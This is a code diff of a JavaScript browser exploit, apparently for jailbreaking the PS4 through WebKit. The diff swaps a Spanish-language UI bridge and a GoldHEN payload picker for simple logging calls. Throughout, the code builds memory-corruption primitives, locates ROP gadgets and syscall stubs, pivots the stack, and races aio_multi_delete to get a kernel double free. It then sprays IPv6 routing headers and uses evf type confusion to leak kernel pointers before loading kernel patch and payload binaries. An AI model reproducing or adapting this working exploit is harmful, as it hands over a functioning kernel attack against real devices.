@@ -1,41 +1,7 @@
-// ============================================
-// BRIDGE PARA REDIRIGIR mark() Y state() A #msgs2
-// (ACTUALIZA EN PANTALLA SIN APELOTONAR NI REPETIR)
-// ============================================
-if (typeof window.__exploitBridge === 'undefined') {
-    window.__exploitBridge = {
-        mark: function(tag, detail) {
-            var msg = tag + (detail ? "  " + detail : "");
-            var msgs2 = document.getElementById("msgs2");
-            if (msgs2) {
-                msgs2.textContent = "";
-                void msgs2.offsetWidth;
-                msgs2.textContent = "★ " + msg;
-            }
-            console.log("[MARK]", tag, detail);
-        },
-        state: function(text, className) {
-            var msgs2 = document.getElementById("msgs2");
-            if (msgs2) {
-                msgs2.textContent = "";
-                void msgs2.offsetWidth;
-                msgs2.textContent = "★ " + text;
-            }
-            console.log("[STATE]", text, className);
-        }
-    };
-}
-window._exploitLines = window._exploitLines || [];
-
 import { establishPrimitive } from "./core.js";
 import { installWindowP } from "./mem.js";
 import { int64 } from "./int64.js";
 import { offsetsFor } from "./ps4_offsets.js";
-
-// ============================================
-// VARIABLES PARA CONTROL DE ESTADO
-// ============================================
-let yaEjecutado = false;
 
 const outEl = document.getElementById("out");
 const stateEl = document.getElementById("state");
@@ -92,8 +58,8 @@ function state(t, c) { stateEl.textContent = t; stateEl.className = c || ""; }
 
 let passCount = 0, failCount = 0;
 function check(name, ok, detail) {
-    if (ok) { passCount++; __exploitBridge.mark("PROOF-OK", name + (detail ? "  " + detail : "")); }
-    else { failCount++; __exploitBridge.mark("PROOF-FAIL", name + (detail ? "  " + detail : "")); }
+    if (ok) { passCount++; mark("PROOF-OK", name + (detail ? "  " + detail : "")); }
+    else { failCount++; mark("PROOF-FAIL", name + (detail ? "  " + detail : "")); }
     return ok;
 }
 function plausibleBase(v) { return v.hi > 0 && (v.low & 0x3fff) === 0; }
@@ -216,7 +182,7 @@ function makeRpc(worker) {
         else slot.resolve(d.value);
     };
     worker.onerror = function (e) {
-        __exploitBridge.mark("WORKER-ONERROR", (e && e.message) ? e.message : String(e));
+        mark("WORKER-ONERROR", (e && e.message) ? e.message : String(e));
     };
     return function call(name) {
         const args = Array.prototype.slice.call(arguments, 1);
@@ -240,6 +206,8 @@ function makeRpc(worker) {
 
         const fwResolved = offsetsFor(navigator.userAgent);
         const fwKey = fwResolved.key;
+        // off.kpatch wins when a firmware shares another's kernel and therefore
+        // its blob -- 12.02 uses 1200.bin. Otherwise derive it from the key.
         const kpatchName = fwResolved.off && fwResolved.off.kpatch
             ? "patches/" + fwResolved.off.kpatch
             : fwKey ? "patches/" + fwKey.replace(".", "") + ".bin" : null;
@@ -250,7 +218,7 @@ function makeRpc(worker) {
                 if (rsp.ok) kpatch = new Uint8Array(await rsp.arrayBuffer());
             }
         } catch (e) {
-            __exploitBridge.mark("KPATCH-FETCH-FAILED", (e && e.message) ? e.message : String(e));
+            mark("KPATCH-FETCH-FAILED", (e && e.message) ? e.message : String(e));
         }
 
         const KPATCH_JMP_SITES = [];
@@ -262,7 +230,7 @@ function makeRpc(worker) {
                     | (kpatch[i + 4] << 16) | (kpatch[i + 5] << 24)) >>> 0);
             }
         }
-        __exploitBridge.mark("KPATCH-BLOB", kpatch
+        mark("KPATCH-BLOB", kpatch
             ? kpatch.length + " bytes of " + kpatchName + " in hand, head "
                 + hexBytes(kpatch.subarray(0, 12))
                 + "   " + KPATCH_JMP_SITES.length + " gateable jump site(s): "
@@ -271,69 +239,18 @@ function makeRpc(worker) {
             : (kpatchName ? "NOT LOADED (" + kpatchName + ") -- stage 9 will not run"
                           : "no firmware key, so no blob name -- stage 9 will not run"));
 
-                          let payload = null;
-try {
-    var autoCheckbox = document.getElementById("checkbox1");
-    var autoOn = autoCheckbox ? autoCheckbox.checked : false;
-    var hayPayloadManual = (typeof window.payloadManualSeleccionado !== 'undefined' && window.payloadManualSeleccionado !== null);
-
-    var archivoPayload = null;
-
-    if (hayPayloadManual) {
-        if (window.payloadManualSeleccionado === "payload") {
-            archivoPayload = "payload.bin";
-        } else if (window.payloadManualSeleccionado === "GoldHENv24b189") {
-            archivoPayload = "GoldHENv24b189.bin";
-        } else if (window.payloadManualSeleccionado === "GoldHENv24b188") {
-            archivoPayload = "GoldHENv24b188.bin";
-        } else if (window.payloadManualSeleccionado === "GoldHENv24b187") {
-            archivoPayload = "GoldHENv24b187.bin";
-        } else if (window.payloadManualSeleccionado === "GoldHENv24b186") {
-            archivoPayload = "GoldHENv24b186.bin";
-        } else if (window.payloadManualSeleccionado === "GoldHENv24b185") {
-            archivoPayload = "GoldHENv24b185.bin";
-        } else if (window.payloadManualSeleccionado === "GoldHENv24b184") {
-            archivoPayload = "GoldHENv24b184.bin";
-
+        let payload = null;
+        try {
+            const prsp = await fetch("payload.bin");
+            if (prsp.ok) payload = new Uint8Array(await prsp.arrayBuffer());
+        } catch (e) {
+            mark("PAYLOAD-FETCH-FAILED", (e && e.message) ? e.message : String(e));
         }
-    } else if (autoOn) {
-        var goldhenSelect = document.getElementById("goldhen-select");
-        if (goldhenSelect) {
-            if (goldhenSelect.value === "goldhen24b18.10") {
-                archivoPayload = "payload.bin";
-            } else if (goldhenSelect.value === "goldhen24b18.9") {
-                archivoPayload = "GoldHENv24b189.bin";
-            } else if (goldhenSelect.value === "goldhen24b18.8") {
-                archivoPayload = "GoldHENv24b188.bin";
-            } else if (goldhenSelect.value === "goldhen24b18.7") {
-                archivoPayload = "GoldHENv24b187.bin";
-            } else if (goldhenSelect.value === "goldhen24b18.6") {
-                archivoPayload = "GoldHENv24b186.bin";
-            } else if (goldhenSelect.value === "goldhen24b18.5") {
-                archivoPayload = "GoldHENv24b185.bin";
-            } else if (goldhenSelect.value === "goldhen24b18.4") {
-                archivoPayload = "GoldHENv24b184.bin";
-            }
-        }
-    }
-
-    if (archivoPayload && (autoOn || hayPayloadManual)) {
-        // __exploitBridge.mark("PAYLOAD-FILE", "archivo=" + archivoPayload + " manual=" + hayPayloadManual + " auto=" + autoOn);
-        const prsp = await fetch(archivoPayload);
-        if (prsp.ok) {
-            payload = new Uint8Array(await prsp.arrayBuffer());
-            __exploitBridge.mark("PAYLOAD-BLOB", "bytes=" + payload.length + " head=" + hexBytes(payload.subarray(0, 12)) + (payload[0] === 0xe9 ? " entry=e9-jmp-rel32" : " entry=NOT-e9"));
-        } else {
-            __exploitBridge.mark("PAYLOAD-FETCH-FAILED", "HTTP " + prsp.status);
-        }
-    } else {
-        __exploitBridge.mark("PAYLOAD-SKIP", "no valid payload selected");
-        __exploitBridge.mark("PAYLOAD-BLOB", "NOT LOADED");
-    }
-} catch (e) {
-    __exploitBridge.mark("PAYLOAD-FETCH-FAILED", (e && e.message) ? e.message : String(e));
-
-}
+        mark("PAYLOAD-BLOB", payload
+            ? "bytes=" + payload.length + " head=" + hexBytes(payload.subarray(0, 12))
+                + (payload[0] === 0xe9 ? " entry=e9-jmp-rel32"
+                                       : " entry=NOT-e9")
+            : "NOT LOADED -- stage 10 will not run");
 
         const ITERS = params.has("iters") ? parseInt(params.get("iters"), 10) : 400;
         const SPRAY_NUM = params.has("spray")
@@ -357,32 +274,32 @@ try {
 
         const ua = navigator.userAgent;
         const { key, off } = offsetsFor(ua);
-        __exploitBridge.mark("FW", key || "(not a PS4 UA)");
-        if (!off) { __exploitBridge.state("no offsets for this firmware"); return; }
+        mark("FW", key || "(not a PS4 UA)");
+        if (!off) { state("no offsets for this firmware", "bad"); return; }
 
-        __exploitBridge.mark("FW-STATUS", key + " -- " + (off.fw_status
+        mark("FW-STATUS", key + " -- " + (off.fw_status
             || "no status recorded in the offsets block."));
-        __exploitBridge.mark("DRY-RUN-PLAN", "budget=" + ITERS + " spray=" + SPRAY_NUM
+        mark("DRY-RUN-PLAN", "budget=" + ITERS + " spray=" + SPRAY_NUM
             + (STOP_PRECOMMIT
                 ? "  -- ?stop=precommit: the second aio_multi_delete WILL BE "
                   + "WITHHELD. Nothing is freed twice and no reboot is owed."
                 : "  -- ARMED: the worker issues a REAL aio_multi_delete"));
 
-        __exploitBridge.state("running the primitive...");
+        state("running the primitive...", "warn");
 
         await new Promise(function (r) { setTimeout(r, 0); });
         const carrier = await establishPrimitive({
             maxAttempts: 6,
 
             onEvent: function (tag, detail, attempt) {
-                __exploitBridge.mark(tag, (attempt != null ? '[' + attempt + '] ' : '')
+                mark(tag, (attempt != null ? '[' + attempt + '] ' : '')
                     + (detail || ''));
             }
         });
         installWindowP(carrier);
         if (!window.p) throw new Error("window.p was not installed");
         p = window.p;
-        __exploitBridge.mark("PRIMITIVE-OK", "");
+        mark("PRIMITIVE-OK", "");
 
         const fnAddr = p.leakval(Math.expm1);
         execAddr = p.read8(fnAddr.add32(0x18));
@@ -390,9 +307,9 @@ try {
         const webkitBase = nativeFn.sub32(off.wk_expm1_builtin);
         const g = function (rva) { return webkitBase.add32(rva); };
         const libkernelBase = p.read8(g(off.wk___imp___error)).sub32(off.k__error);
-        __exploitBridge.mark("BASES", "webkit=" + webkitBase + " libkernel=" + libkernelBase);
+        mark("BASES", "webkit=" + webkitBase + " libkernel=" + libkernelBase);
         if (!plausibleBase(webkitBase) || !plausibleBase(libkernelBase)) {
-            __exploitBridge.state("a base looks wrong"); return;
+            state("a base looks wrong", "bad"); return;
         }
 
         const GADGETS = [
@@ -415,6 +332,7 @@ try {
                 [0x55, 0x48, 0x89, 0xe5, 0x48, 0x8b, 0x07, 0xff, 0x50, 0x10], false, true],
             ["G3", off.wk_MOV_RDI_RAX_8_CALL_20,
                 [0x48, 0x8b, 0x78, 0x08, 0x48, 0x8b, 0x07, 0xff, 0x50, 0x20], false, true],
+
             ["G4", off.wk_MOV_RDX_RAX_18_CALL_10,
                 [0x48, 0x8b, 0x50, off.pivot_view_sp,
                  0x48, 0x8b, 0x07, 0xff, 0x50, 0x10], false, true]
@@ -440,28 +358,28 @@ try {
             let use = rva, r = readRun(rva);
             if (!r.ok && rebasable) {
                 const alt = readRun(rva - 1);
-                if (alt.ok) { use = rva - 1; r = alt; __exploitBridge.mark("GADGET-REBASED", name); }
+                if (alt.ok) { use = rva - 1; r = alt; mark("GADGET-REBASED", name); }
             }
             if (r.ok) { gated++; G[name] = g(use); }
             else {
                 if (required) fatal = true;
-                __exploitBridge.mark("GADGET-BYTES", name + " @0x" + use.toString(16) + " got "
+                mark("GADGET-BYTES", name + " @0x" + use.toString(16) + " got "
                     + hexBytes(r.got) + " want " + hexBytes(want) + "  MISMATCH");
             }
         }
         check("gadget-table-fits-module", !fatal,
             gated + "/" + GADGETS.length + " gated");
-        if (fatal) { __exploitBridge.state("gadget bytes did not match"); return; }
+        if (fatal) { state("gadget bytes did not match", "bad"); return; }
         const argGadget = [G.POP_RDI_RET, G.POP_RSI_RET, G.POP_RDX_RET,
                            G.POP_RCX_RET, G.POP_R8_RET, G.POP_R9_RET];
         check("5-argument-calls-possible-pop-r8", !!argGadget[4], "");
-        if (!argGadget[4]) { __exploitBridge.state("no pop r8"); return; }
+        if (!argGadget[4]) { state("no pop r8", "bad"); return; }
 
         const SYS9 = { mmap: 0x1dd, jitshm_create: 0x215, kexec: 0x295 };
         const wanted = [];
         for (const k in SYS) wanted.push(SYS[k]);
         for (const k in SYS9) wanted.push(SYS9[k]);
-        __exploitBridge.state("scanning libkernel for syscall stubs...");
+        state("scanning libkernel for syscall stubs...", "warn");
         const tScan = Date.now();
         const stubRva = new Map();
 
@@ -477,7 +395,7 @@ try {
                 if (got !== num) { seedBad++; continue; }
                 stubRva.set(num, o); seeded++;
             }
-            __exploitBridge.mark("STUB-TABLE", "seeded=" + seeded + "/"
+            mark("STUB-TABLE", "seeded=" + seeded + "/"
                 + Object.keys(off.k_stubs).length + " rejected=" + seedBad);
         }
         {
@@ -492,7 +410,7 @@ try {
                 if (need.has(num)) { stubRva.set(num, o); need.delete(num); }
             }
         }
-        __exploitBridge.mark("STUB-SCAN", stubRva.size + "/" + wanted.length + " in "
+        mark("STUB-SCAN", stubRva.size + "/" + wanted.length + " in "
             + (Date.now() - tScan) + " ms");
         const stubAddr = new Map();
         const missing = [];
@@ -511,7 +429,7 @@ try {
             missing.length === 0,
             missing.length ? "missing: " + missing.join(",")
                 : Object.keys(SYS).length + "/" + Object.keys(SYS).length);
-        if (missing.length) { __exploitBridge.state("missing syscall stubs"); return; }
+        if (missing.length) { state("missing syscall stubs", "bad"); return; }
 
         {
             const got9 = [];
@@ -525,7 +443,7 @@ try {
                            && p.read1(a.add32(14)) === 0xc3;
                 got9.push(k + (plain ? "=stub" : "=wrapper"));
             }
-            __exploitBridge.mark("STAGE9-STUBS", got9.join("  "));
+            mark("STAGE9-STUBS", got9.join("  "));
         }
 
         function bufAddr(ab) {
@@ -570,7 +488,7 @@ try {
         }
         const mainCtx = makeCtx("main"), wrkCtx = makeCtx("worker");
         check("chain-contexts-round-tripped", !!mainCtx && !!wrkCtx, "");
-        if (!mainCtx || !wrkCtx) { __exploitBridge.state("backing stores failed"); return; }
+        if (!mainCtx || !wrkCtx) { state("backing stores failed", "bad"); return; }
 
         function layout(c, insts, targetIdx) {
             c.stackU8.fill(0); c.frameU8.fill(0);
@@ -634,7 +552,7 @@ try {
         const mFuncAt = execAddr.add32(off.wk_JSFunction_m_function);
         origNative = p.read8(mFuncAt);
         if (!sameI64(origNative, nativeFn)) {
-            __exploitBridge.state("m_function moved under us"); return;
+            state("m_function moved under us", "bad"); return;
         }
         const mainPivotObj = {};
         keepAlive.push(mainPivotObj);
@@ -707,9 +625,9 @@ try {
                               mainCtx.frameDv.getUint32(12, true));
         check("main-thread-pivot-lands", sameI64(wit, mainCtx.P),
             wit + " want " + mainCtx.P);
-        if (!sameI64(wit, mainCtx.P)) { __exploitBridge.state("pivot failed"); return; }
+        if (!sameI64(wit, mainCtx.P)) { state("pivot failed", "bad"); return; }
         const pid = sc(SYS.getpid).i32;
-        __exploitBridge.mark("PID", String(pid));
+        mark("PID", String(pid));
 
         function alloc(len) {
             const ab = new ArrayBuffer(len);
@@ -736,7 +654,7 @@ try {
         const prioBuf = alloc(4);
 
         restoreCtx = { maskBuf: maskBuf, prioBuf: prioBuf };
-        __exploitBridge.mark("BUFFERS", "reqs1=" + reqs1.addr + " outs=" + outs.addr
+        mark("BUFFERS", "reqs1=" + reqs1.addr + " outs=" + outs.addr
             + " aio_ids=" + aioIds.addr);
 
         function buildReqs1(count, fd) {
@@ -767,7 +685,7 @@ try {
                 return c.join(",");
             })() + " are available to this process)");
 
-        __exploitBridge.state("wiring the worker...");
+        state("wiring the worker...", "warn");
         worker = new Worker("rpc_worker.js");
         rpc = makeRpc(worker);
         await rpc("ping");
@@ -776,7 +694,7 @@ try {
         const D = bufAddr(markerArr.buffer);
         if ((p.read4(D) >>> 0) !== SENT_LO) {
             check("transferred-store-worker-memory", false, "D=" + D);
-            __exploitBridge.state("transfer did not preserve the store"); return;
+            state("transfer did not preserve the store", "bad"); return;
         }
         function ptrish(v) { return v.hi > 0 && v.hi < 0x10000 && (v.low & 7) === 0; }
         const storage = p.read8(D.add32(0x10));
@@ -784,7 +702,7 @@ try {
         if (!markerCell || !ptrish(markerCell)) {
             check("walk-reached-worker-marker", false,
                 "storage=" + storage + " cell=" + markerCell);
-            __exploitBridge.state("walk failed -- run step 4b for the dump"); return;
+            state("walk failed -- run step 4b for the dump", "bad"); return;
         }
         const butterfly = p.read8(markerCell.add32(8));
         let wMaster = null, wVictim = null, wLeak = null;
@@ -799,7 +717,7 @@ try {
         }
         check("walk-found-worker-victim-master",
             !!(wMaster && wVictim && wLeak), "master=" + wMaster);
-        if (!(wMaster && wVictim && wLeak)) { __exploitBridge.state("walk failed"); return; }
+        if (!(wMaster && wVictim && wLeak)) { state("walk failed", "bad"); return; }
         wMasterAddr = wMaster;
         origWorkerVector = p.read8(wMaster.add32(0x10));
         p.write8(wMaster.add32(0x10), wVictim);
@@ -807,7 +725,7 @@ try {
         await rpc("setup", wLeak.low, wLeak.hi);
         await rpc("armPivot", G.G0.low, G.G0.hi);
         workerArmed = true;
-        __exploitBridge.mark("WORKER-READY", "wired and armed");
+        mark("WORKER-READY", "wired and armed");
 
         function fireWorkerAsync(num, args) {
             const t = stubAddr.get(num);
@@ -828,20 +746,20 @@ try {
         check("worker-answers-before-arm",
             (await rpc("ping")) === "pong", "");
 
-        __exploitBridge.state("setting up the aio batches...");
+        state("setting up the aio batches...", "warn");
         const pairBuf = alloc(8);
         if (sc(SYS.socketpair, 1, SOCK_STREAM, 0, pairBuf.addr).i32 === -1)
             throw new Error("socketpair failed");
         const blockSs = [pairBuf.dv.getInt32(0, true), pairBuf.dv.getInt32(4, true)];
         openFds.push(blockSs[0], blockSs[1]);
-        __exploitBridge.mark("BLOCK-SS", blockSs.join(","));
+        mark("BLOCK-SS", blockSs.join(","));
 
         buildReqs1(WORKER_NUM, blockSs[0]);
         const tBlock = Date.now();
         sc(SYS.aio_submit_cmd, AIO_CMD_READ, reqs1.addr, WORKER_NUM,
             AIO_PRIORITY_HIGH, blockIds.addr);
         const blockId = blockIds.dv.getUint32(0, true);
-        __exploitBridge.mark("BLOCK-AIO", "id=" + hx(blockId) + "  " + (Date.now() - tBlock) + " ms");
+        mark("BLOCK-AIO", "id=" + hx(blockId) + "  " + (Date.now() - tBlock) + " ms");
         check("blocking-aio-request-accepted", blockId !== 0, "");
         if (blockId !== 0) liveAioIds.push(blockId);
 
@@ -854,7 +772,7 @@ try {
         let sprayNonZero = 0;
         for (let i = 0; i < SPRAY_NUM; ++i)
             if (sprayIds.dv.getUint32(i * 4, true) !== 0) sprayNonZero++;
-        __exploitBridge.mark("SPRAY-AIO", SPRAY_NUM + " submits, " + sprayNonZero
+        mark("SPRAY-AIO", SPRAY_NUM + " submits, " + sprayNonZero
             + " ids, " + sprayMs + " ms  ("
             + (sprayMs / SPRAY_NUM).toFixed(2) + " ms per ROP syscall)");
         check("spray-submit-returned-id", sprayNonZero === SPRAY_NUM, "");
@@ -864,9 +782,9 @@ try {
             const step = Math.min(AIO_MAX_NUM, SPRAY_NUM - off2);
             sc(SYS.aio_multi_cancel, sprayIds.addr.add32(off2 * 4), step, outs.addr);
         }
-        __exploitBridge.mark("SPRAY-CANCELLED", "");
+        mark("SPRAY-CANCELLED", "");
 
-        __exploitBridge.state("dry run: everything but the racing delete...");
+        state("dry run: everything but the racing delete...", "warn");
         servAddr.dv.setUint8(0, 16);
         servAddr.dv.setUint8(1, AF_INET);
         servAddr.dv.setUint16(2, 0x8d13, true);
@@ -886,7 +804,7 @@ try {
         check("loopback-server-socket-bound-listening",
             br === 0 && lr2 === 0, "bind=" + br + " listen=" + lr2
             + " fd=" + server);
-        if (br !== 0 || lr2 !== 0) { __exploitBridge.state("could not set up the server"); }
+        if (br !== 0 || lr2 !== 0) { state("could not set up the server", "bad"); }
 
         const PIPE_SYS = 42, F_SETFL = 4, O_NONBLOCK = 4;
         const FIOSETOWN = 0x8004667c;
@@ -964,16 +882,16 @@ try {
             wideLen = Math.min(Math.floor(snd / 2), wideBuf.len);
             if (!(snd > 0 && wideLen > PEER_RCVBUF)) {
                 wideWindow = false;
-                __exploitBridge.mark("WIDEN-DISABLED", "sndbuf=" + snd + " peer_rcvbuf="
+                mark("WIDEN-DISABLED", "sndbuf=" + snd + " peer_rcvbuf="
                     + PEER_RCVBUF + " widen=off");
             } else {
-                __exploitBridge.mark("WIDEN", "one " + wideLen + " byte write per attempt, peer "
+                mark("WIDEN", "one " + wideLen + " byte write per attempt, peer "
                     + "receive buffer " + PEER_RCVBUF
                     + " -- soclose should hold for l_linger (1 s), against the "
                     + "0.3 ms an idle close takes");
             }
         } else {
-            __exploitBridge.mark("WIDEN-OFF", "?wide=0 -- running the old microsecond window");
+            mark("WIDEN-OFF", "?wide=0 -- running the old microsecond window");
         }
 
         const WHICH = NUM_REQS - 1;
@@ -1017,9 +935,9 @@ try {
             "rtprio main=" + mp + " worker=" + wp
             + "  affinity main=" + ma + " worker=" + wa);
         if (!(mp === 0 && wp === 0 && ma === 0 && wa === 0)) {
-            __exploitBridge.mark("REFUSING-TO-ARM", "reason=core-pin-failed");
-            __exploitBridge.state("could not pin -- refusing to arm");
-            __exploitBridge.mark("PROOF-SUMMARY", "pass=" + passCount + " fail=" + failCount);
+            mark("REFUSING-TO-ARM", "reason=core-pin-failed");
+            state("could not pin -- refusing to arm", "bad");
+            mark("PROOF-SUMMARY", "pass=" + passCount + " fail=" + failCount);
             return;
         }
 
@@ -1038,16 +956,16 @@ try {
                           "thr_resume_ucontext"]) {
             if (!stubAddr.get(SYS[nm])) {
                 check("stub for " + nm, false, "");
-                __exploitBridge.mark("REFUSING-TO-ARM", "reason=no-stub:" + nm);
-                __exploitBridge.state("missing " + nm);
-                __exploitBridge.mark("PROOF-SUMMARY", "pass=" + passCount + " fail=" + failCount);
+                mark("REFUSING-TO-ARM", "reason=no-stub:" + nm);
+                state("missing " + nm, "bad");
+                mark("PROOF-SUMMARY", "pass=" + passCount + " fail=" + failCount);
                 return;
             }
         }
         if (!(wTid !== 0 && wTid !== myTid)) {
-            __exploitBridge.mark("REFUSING-TO-ARM", "reason=no-worker-tid");
-            __exploitBridge.state("no worker tid");
-            __exploitBridge.mark("PROOF-SUMMARY", "pass=" + passCount + " fail=" + failCount);
+            mark("REFUSING-TO-ARM", "reason=no-worker-tid");
+            state("no worker tid", "bad");
+            mark("PROOF-SUMMARY", "pass=" + passCount + " fail=" + failCount);
             return;
         }
         check("worker-answers-after-being-pinned",
@@ -1075,9 +993,9 @@ try {
             ipv6Socks.length + "/" + IPV6_SOCK_NUM
             + " AF_INET6 sockets, rthdr len 0x" + sprayRthdrLen.toString(16));
         if (ipv6Socks.length !== IPV6_SOCK_NUM) {
-            __exploitBridge.state("cannot stand up the reclaim -- refusing to arm");
-            __exploitBridge.mark("REFUSING-TO-ARM", "reason=no-reclaim-ready");
-            __exploitBridge.mark("PROOF-SUMMARY", "pass=" + passCount + " fail=" + failCount);
+            state("cannot stand up the reclaim -- refusing to arm", "bad");
+            mark("REFUSING-TO-ARM", "reason=no-reclaim-ready");
+            mark("PROOF-SUMMARY", "pass=" + passCount + " fail=" + failCount);
             return;
         }
 
@@ -1114,8 +1032,8 @@ try {
             return null;
         }
 
-        __exploitBridge.state("Jailbreak in progress ...");
-        __exploitBridge.mark("ARMED", "one core " + ONE_CORE + ", suspend rendezvous, attempts=" + ATTEMPTS
+        state("racing...", "warn");
+        mark("ARMED", "one core " + ONE_CORE + ", suspend rendezvous, attempts=" + ATTEMPTS
             + "  -- the worker now issues a REAL aio_multi_delete");
 
         let won = false, confirmed = false, twins = null;
@@ -1139,7 +1057,7 @@ try {
         let lastPollErr = 0, lastTcp = 0, raceErr0 = 0, raceErr1 = 0;
         const tRace = Date.now();
         heartbeat = setInterval(function () {
-            __exploitBridge.mark("RACE-PROGRESS", "attempt=" + attemptsUsed
+            post("RACE-PROGRESS", "attempt=" + attemptsUsed
                 + " detector_fired=" + detectorFired + " real_frees=" + realFrees
                 + " early=" + tooEarlySeen + " window=" + inWindowSeen
                 + " late=" + tooLateSeen
@@ -1267,7 +1185,7 @@ try {
                     if (STOP_PRECOMMIT) {
 
                         precommitHits++;
-                        __exploitBridge.mark("PRECOMMIT-HELD", "attempt=" + it
+                        mark("PRECOMMIT-HELD", "attempt=" + it
                             + " delete2=withheld committed=false");
                     } else {
                         sc(SYS.aio_multi_delete,
@@ -1324,41 +1242,41 @@ try {
         const raceMs = Date.now() - tRace;
         if (heartbeat) { clearInterval(heartbeat); heartbeat = 0; }
 
-        if (setupFail) __exploitBridge.mark("SOCKET-SETUP-FAILED", setupFail);
-        __exploitBridge.mark("RACE-DONE", attemptsUsed + " attempts in " + raceMs + " ms, "
+        if (setupFail) mark("SOCKET-SETUP-FAILED", setupFail);
+        mark("RACE-DONE", attemptsUsed + " attempts in " + raceMs + " ms, "
             + "detector fired " + detectorFired + " time(s): " + realFrees
             + " real double free(s), " + benignHits + " harmless misfire(s)");
-        if (dupSeen) __exploitBridge.mark("DUP-FDS", dupSeen + " same-fd pair(s) rejected -- "
+        if (dupSeen) mark("DUP-FDS", dupSeen + " same-fd pair(s) rejected -- "
             + "closed descriptors were still listed in the socket pool");
-        __exploitBridge.mark("PROBE", "walked the worker forward " + (rendezvous ? (probeTotal / rendezvous).toFixed(1) : "-")
+        mark("PROBE", "walked the worker forward " + (rendezvous ? (probeTotal / rendezvous).toFixed(1) : "-")
             + " steps on average, worst " + probeMax + " of " + PROBE_CAP
             + ", " + resuspendFail + " re-suspend failures"
             + "   -- pinned at the cap means raise ?probes=");
-        __exploitBridge.mark("DETECTOR", STRICT_TCP
+        mark("DETECTOR", STRICT_TCP
             ? "poll_err+tcp_state+worker_in_delete"
             : "poll_err+worker_in_delete (tcp_state=report-only)");
-        __exploitBridge.mark("STUCK-DATA", stuckOk + " attempts left " + stuckBytes
+        mark("STUCK-DATA", stuckOk + " attempts left " + stuckBytes
             + " bytes outstanding, " + stuckFail + " writes failed");
-        __exploitBridge.mark("RENDEZVOUS", rendezvous + " suspends: in-window " + inWindowSeen
+        mark("RENDEZVOUS", rendezvous + " suspends: in-window " + inWindowSeen
             + " / already finished " + tooLateSeen
             + "   handoff cost " + (rendezvous ? (yieldTotal / rendezvous).toFixed(1)
                                                : "-") + " yields"
             + "   dropped: " + neverStarted + " never started, "
             + suspendFail + " suspend refused");
-        __exploitBridge.mark("WINDOW-RATE", "in-window at the decision: " + inWindowSeen + "/"
+        mark("WINDOW-RATE", "in-window at the decision: " + inWindowSeen + "/"
             + (inWindowSeen + tooLateSeen)
             + "   -- with the worker frozen this should be near 1.0, unlike the "
             + "0.33% a spacer could reach");
         if (misfireCap)
-            __exploitBridge.mark("MISFIRE-CAP", benignHits + " detector hits produced no clean double "
+            mark("MISFIRE-CAP", benignHits + " detector hits produced no clean double "
                 + "free, so the loop stopped instead of racing on. the timing is "
                 + "off -- try a different ?spacer= before spending another boot.");
         if (reclaimFailed)
-            __exploitBridge.mark("RECLAIM-FAILED", "a real double free could not be reclaimed. "
+            mark("RECLAIM-FAILED", "a real double free could not be reclaimed. "
                 + "the loop stopped rather than free more chunks it cannot "
                 + "account for. this chunk is dangling -- reboot.");
         if (detectorFired) {
-            __exploitBridge.mark("WIN-EVIDENCE", "poll_err=" + hx(lastPollErr)
+            mark("WIN-EVIDENCE", "poll_err=" + hx(lastPollErr)
                 + " tcp_state=" + lastTcp
                 + "   worker chain at the decision: started="
                 + phaseAtDecision[1] + " finished=" + phaseAtDecision[0]
@@ -1369,7 +1287,7 @@ try {
             detectorFired + " detector hits in " + attemptsUsed + " attempts");
         if (STOP_PRECOMMIT) {
 
-            __exploitBridge.mark("PRECOMMIT-STOP", "held=" + precommitHits + " attempts="
+            mark("PRECOMMIT-STOP", "held=" + precommitHits + " attempts="
                 + attemptsUsed + " committed=false reboot=false");
             check("precommit stopped clean",
                 !committed && !rebootRequired,
@@ -1386,10 +1304,10 @@ try {
 
         if (twins) {
             twinSocks.push(twins.a, twins.b);
-            __exploitBridge.mark("DOUBLE-FREE-ACHIEVED", "fds " + twinSocks.join(" and ")
+            mark("DOUBLE-FREE-ACHIEVED", "fds " + twinSocks.join(" and ")
                 + " now alias one 0x80 allocation");
 
-            __exploitBridge.state("leaking kernel addresses...");
+            state("leaking kernel addresses...", "warn");
             const leakOk = (function () {
                 function getRthdr(sock, size) {
                     leakLen.dv.setInt32(0, size, true);
@@ -1418,7 +1336,7 @@ try {
                     prioBuf.dv.setUint16(0, savedPrio[0], true);
                     prioBuf.dv.setUint16(2, savedPrio[1], true);
                     const pr = sc(SYS.rtprio_thread, RTP_SET, 0, prioBuf.addr).i32;
-                    __exploitBridge.mark("SCHED-RELEASED", "affinity=" + ar + " back to "
+                    mark("SCHED-RELEASED", "affinity=" + ar + " back to "
                         + savedMask + ", rtprio=" + pr + " back to {"
                         + savedPrio + "} -- stage 2 must not run realtime on "
                         + "one core");
@@ -1426,10 +1344,10 @@ try {
 
                 const dirty = twinSocks[0];
                 if (sc(SYS.close, twinSocks[1]).i32 === -1) {
-                    __exploitBridge.mark("LEAK-FAIL", "could not close twin " + twinSocks[1]);
+                    mark("LEAK-FAIL", "could not close twin " + twinSocks[1]);
                     return false;
                 }
-                __exploitBridge.mark("TWIN-CLOSED", "fd " + twinSocks[1] + " freed the rthdr; "
+                mark("TWIN-CLOSED", "fd " + twinSocks[1] + " freed the rthdr; "
                     + "fd " + dirty + " still points at it");
 
                 const evfName = alloc(8);
@@ -1460,7 +1378,7 @@ try {
                     }
                     for (let i = 0; i < evfs.length; ++i)
                         sc(SYS.evf_delete, evfs[i]);
-                    if (evf >= 0) __exploitBridge.mark("EVF-CONFUSED", "evf=" + hx(evf)
+                    if (evf >= 0) mark("EVF-CONFUSED", "evf=" + hx(evf)
                         + " after " + round + " round(s)");
                 }
                 if (!check("evf-type-confused-rthdr", evf >= 0,
@@ -1469,8 +1387,8 @@ try {
                 const evfCv = lk8(0x28);
 
                 const reqs2Addr = lk8(0x40).sub32(0x38);
-                __exploitBridge.mark("KADDR-EVF-CV", evfCv.toString());
-                __exploitBridge.mark("KADDR-REQS2", reqs2Addr.toString());
+                mark("KADDR-EVF-CV", evfCv.toString());
+                mark("KADDR-REQS2", reqs2Addr.toString());
                 if (!check("leaked-evf-holds-kernel-pointers",
                         kptr(evfCv) && kptr(reqs2Addr),
                         "cv=" + evfCv + " reqs2=" + reqs2Addr)) return false;
@@ -1493,7 +1411,7 @@ try {
                         reqs1.dv.setInt32(o + AIO_RW_REQ_FD, leakPipe[1], true);
                         reqs1.dv.setUint32(o + AIO_RW_REQ_NBYTE, LEAK_NBYTE, true);
                     }
-                    __exploitBridge.mark("LEAK-FD", "every leak request names fd " + leakPipe[1]
